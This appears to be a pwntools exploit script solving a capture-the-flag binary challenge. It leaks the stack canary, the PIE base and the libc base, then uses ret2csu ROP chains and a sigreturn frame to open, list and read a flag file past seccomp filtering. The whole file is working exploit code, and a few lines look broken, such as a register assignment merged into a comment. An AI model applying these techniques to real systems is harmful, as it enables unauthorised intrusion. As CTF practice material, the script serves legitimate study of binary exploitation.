from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"
libc = ELF("/usr/lib/libc.so.6", checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send_1(self, content):
        p = self.p
        p.send(content)

    def get_canary(self):
        p = self.p
        p.recvuntil(
            b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
        recv = b'\x00'
        for i in range(7):
            recv += (p.recv(1))
        p.recvline()
        return bytes_to_long(recv[::-1])

    def send_2(self, content):
        p = self.p
        p.sendafter(b"Input Your Answer : ", content)

    def get_pie(self):
        p = self.p
        p.recvuntil(
            b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
        recv = p.recv(6)
        return bytes_to_long(recv[::-1])

    def return_to(self, *address: int):
        def rop(x): return ROP(exe).find_gadget(x)[0]
        pay = flat(
            cyclic(88),
            canary,
            0,
            rop(['ret']),
            *address
        )
        self.send_2(pay)

    def leak_address(self, address: int):
        self.send_1(b"A"*88)
        def rop(x): return ROP(exe).find_gadget(x)[0]
        pay = flat(
            rop(['ret']),
            rop(['pop rdi', 'ret']),
            address,
            exe.plt['puts'],
            exe.sym['vuln'],
        )
        self.return_to(pay)
        p = self.p
        p.recvuntil(b"Thanks you\n")
        return bytes_to_long(p.recvline()[::-1].strip())


x, p = init()
x.send_1(b"A"*89)
canary = x.get_canary()
log.info(f"{canary=:x}")
pay = flat(
    cyclic(88),
    canary,
    0,
)

pay += b"\x0c"
x.send_2(pay)
x.send_1(b"A"*(88+16))
main_pie = x.get_pie()-0x1511
exe.address = main_pie

x.return_to(exe.sym['vuln'])
libc_leak = x.leak_address(exe.got['write']) - libc.sym['write']
libc.address = libc_leak
log.info(f"{exe.address=:x}")
log.info(f"{libc.address=:x}")


def leak():
    x.return_to(exe.sym['vuln'])
    log.info(f"{x.leak_address(exe.got['seccomp_init'])=:x}")
    log.info(f"{x.leak_address(exe.got['seccomp_rule_add'])=:x}")
    log.info(f"{x.leak_address(exe.got['puts'])=:x}")
    log.info(f"{x.leak_address(exe.got['write'])=:x}")
    log.info(f"{x.leak_address(exe.got['seccomp_load'])=:x}")
    log.info(f"{x.leak_address(exe.got['__stack_chk_fail'])=:x}")
    log.info(f"{x.leak_address(exe.got['printf'])=:x}")
    log.info(f"{x.leak_address(exe.got['alarm'])=:x}")
    log.info(f"{x.leak_address(exe.got['read'])=:x}")
    log.info(f"{x.leak_address(exe.got['setvbuf'])=:x}")
    log.info(f"{x.leak_address(exe.got['exit'])=:x}")


x.debug("break *vuln+186\nc")

x.send_1(b"A")

bss_file = exe.bss()+0x900-64
bss_rop = exe.bss()+0x900
bss_junk = exe.bss()+0x100
bss_orw = exe.bss()+0x300

syscall = libc.sym['alarm']+5

pop_csu = exe.sym['__libc_csu_init']+82
call_csu = exe.sym['__libc_csu_init']+56

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 1, r12_a =0, r13_a = 0, r14_a = 0, r15_a = 0,pop_csu_on = 1):
    p_csu =''
    if pop_csu_on :
        p_csu = p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(edi) # r12
        p_csu += p64(rsi) # r13
        p_csu += p64(rdx) # r14
        p_csu += p64(call_func) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15
    return p_csu

def rop(x): return ROP(libc).find_gadget(x)[0]


x.return_to(ret2csu(exe.got['read'],0,bss_file,0x400,rbp_a = bss_rop-8))

p = b'flag-9f3fc92a9ac477c1bad673461c5185f3.txt\x00'.ljust(64,b"\x00")
p += ret2csu(exe.got['read'], 0, bss_junk, 15)
p += p64(syscall)
frame = SigreturnFrame()
frame.rax = 2 # 59 excerve 0x3b
frame.rdi = bss_file # bss -> "/bin/sh\x00"
frame.rsi = 0 # harus 0
frame.rdx = 0 # harus 0frame.rsp = bss_rop + 0x180 # exe.bss() + 0x380-8
frame.rip = syscall # jump -> syscall
p += str(frame).encode()
p += p64(syscall)
dir_list = True
if dir_list:
    p += ret2csu(exe.got['read'], 0, bss_junk, 78) # rax 78
    p += ret2csu(exe.bss() + 0x380-8, 3, bss_orw, 0x200)
else:
    p += ret2csu(exe.got['read'], 3, bss_orw, 0x200) # rax 78

p += ret2csu(exe.got['write'], 1, bss_orw, 0x400)

x.send_1(b"A")
x.return_to(p)

p.interactive()
